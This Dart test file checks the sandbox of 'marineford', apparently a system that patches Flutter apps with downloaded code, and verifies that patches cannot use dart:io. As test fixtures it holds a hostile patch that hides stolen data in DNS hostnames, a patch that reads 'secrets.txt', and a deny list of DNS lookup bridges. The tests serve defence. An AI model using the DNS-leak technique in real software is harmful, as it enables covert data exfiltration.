import 'package:dart_eval/dart_eval.dart';
import 'package:dart_eval/dart_eval_bridge.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:marineford/marineford.dart';

const _header = '''
class RuntimeOverride {
  const RuntimeOverride(this.id, {this.version});
  final String id;
  final String? version;
}
''';

/// Compiles a patch the way `marineford build` does, imports and all.
Runtime compile(String body, {String imports = ''}) {
  final program = Compiler().compile(<String, Map<String, String>>{
    'p': <String, String>{'main.dart': '$imports$_header\n$body'},
  });
  return Runtime(program.write().buffer.asByteData());
}

void main() {
  tearDown(Patch.resetForTesting);

  group('dart:io is unreachable from a patch', () {
    test('a DNS lookup is refused instead of resolved', () async {
      // The hole this closes. dart_eval gates filesystem, network and process
      // behind assertPermission and marineford grants nothing, so all of those
      // already threw. socket.dart gates nothing, so InternetAddress.lookup ran
      // for real — a patch could encode stolen data into a hostname and the
      // query would reach the attacker's nameserver, bypassing the network
      // permission entirely and leaving no HTTP trace.
      final failures = <Object>[];
      final runtime = compile(
        '''
@RuntimeOverride('#leak', version: '>=1.0.0')
int leak(int a) {
  InternetAddress.lookup('secret-\$a.example.invalid');
  return a;
}
''',
        imports: "import 'dart:io';\n",
      );
      runtime.addPlugin(const MarinefordSandbox());
      runtime.loadGlobalOverrides();
      Patch.activate(
        runtime,
        resolveSlots(runtime, Version.parse('1.0.0')),
        failureThreshold: 99,
        onFailure: (_, error, __) => failures.add(error),
      );

      expect(Patch.invoke1(Patch.slot('#leak')!, 7, '#leak'), isNull,
          reason: 'the shim must fall back to the original function');
      expect(failures.single.toString(), contains('denied'));

      // Nothing was queued behind it either. A denial that still started the
      // lookup would defeat the point.
      await Future<void>.delayed(const Duration(milliseconds: 50));
    });

    test('every ungated dart:io bridge is taken over, not just lookup', () {
      // Named individually so that adding one to the deny list without a test
      // is visible, and so the list cannot quietly shrink.
      expect(
        MarinefordSandbox.deniedIoBridges,
        containsAll(<String>[
          'InternetAddress.',
          'InternetAddress.fromRawAddress',
          'InternetAddress.lookup',
          'InternetAddress.tryParse',
        ]),
      );
    });

    test('the gated ones were already denied, and still are', () {
      // Not marineford's doing — dart_eval is default-deny and marineford
      // grants nothing. Asserted anyway, because "we grant nothing" is a claim
      // about a default someone else owns, and this is what catches it
      // changing.
      final failures = <Object>[];
      final runtime = compile(
        '''
@RuntimeOverride('#read', version: '>=1.0.0')
int read(int a) {
  File('secrets.txt').readAsStringSync();
  return a;
}
''',
        imports: "import 'dart:io';\n",
      );
      runtime.addPlugin(const MarinefordSandbox());
      runtime.loadGlobalOverrides();
      Patch.activate(
        runtime,
        resolveSlots(runtime, Version.parse('1.0.0')),
        failureThreshold: 99,
        onFailure: (_, error, __) => failures.add(error),
      );

      expect(Patch.invoke1(Patch.slot('#read')!, 1, '#read'), isNull);
      expect(failures.single.toString(),
          anyOf(contains('filesystem'), contains('denied')));
    });

    test('a denial is an ordinary failure, so the patch is eventually dropped',
        () {
      // A denied capability must not be special. It reaches the dispatcher like
      // any other exception from downloaded code: fall back, count it, and give
      // up on a patch that keeps doing it.
      final runtime = compile(
        '''
@RuntimeOverride('#leak', version: '>=1.0.0')
int leak(int a) {
  InternetAddress.lookup('x.example.invalid');
  return a;
}
''',
        imports: "import 'dart:io';\n",
      );
      runtime.addPlugin(const MarinefordSandbox());
      runtime.loadGlobalOverrides();
      Patch.activate(runtime, resolveSlots(runtime, Version.parse('1.0.0')),
          failureThreshold: 2);

      final slot = Patch.slot('#leak')!;
      expect(Patch.invoke1(slot, 1, '#leak'), isNull);
      expect(Patch.isActive, isTrue, reason: 'one failure is not enough');
      expect(Patch.invoke1(slot, 1, '#leak'), isNull);
      expect(Patch.isActive, isFalse, reason: 'two in a row is');
    });
  });

  group('an app plugin cannot reopen the hole', () {
    test('the sandbox is added last and wins', () {
      // Registration order decides which implementation of a bridge survives,
      // and the client adds the sandbox after the app's own plugins for exactly
      // this reason. An app that pulls in a third-party plugin should not be
      // able to get dart:io back by accident.
      final failures = <Object>[];
      final runtime = compile(
        '''
@RuntimeOverride('#leak', version: '>=1.0.0')
int leak(int a) {
  InternetAddress.lookup('x.example.invalid');
  return a;
}
''',
        imports: "import 'dart:io';\n",
      );
      runtime.addPlugin(_ReopeningPlugin());
      runtime.addPlugin(const MarinefordSandbox());
      runtime.loadGlobalOverrides();
      Patch.activate(
        runtime,
        resolveSlots(runtime, Version.parse('1.0.0')),
        failureThreshold: 99,
        onFailure: (_, error, __) => failures.add(error),
      );

      expect(Patch.invoke1(Patch.slot('#leak')!, 1, '#leak'), isNull);
      expect(failures.single.toString(), contains('denied'),
          reason: 'the plugin that tried to restore lookup was added first, so '
              'the sandbox overwrote it');
    });
  });
}

/// Stands in for an app plugin that re-registers dart:io's DNS lookup.
final class _ReopeningPlugin implements EvalPlugin {
  @override
  String get identifier => 'reopening';

  @override
  void configureForCompile(BridgeDeclarationRegistry registry) {}

  @override
  void configureForRuntime(Runtime runtime) {
    runtime.registerBridgeFunc(
      'dart:io',
      'InternetAddress.lookup',
      (Runtime rt, $Value? target, List<$Value?> args) =>
          throw StateError('REOPENED'),
    );
  }
}
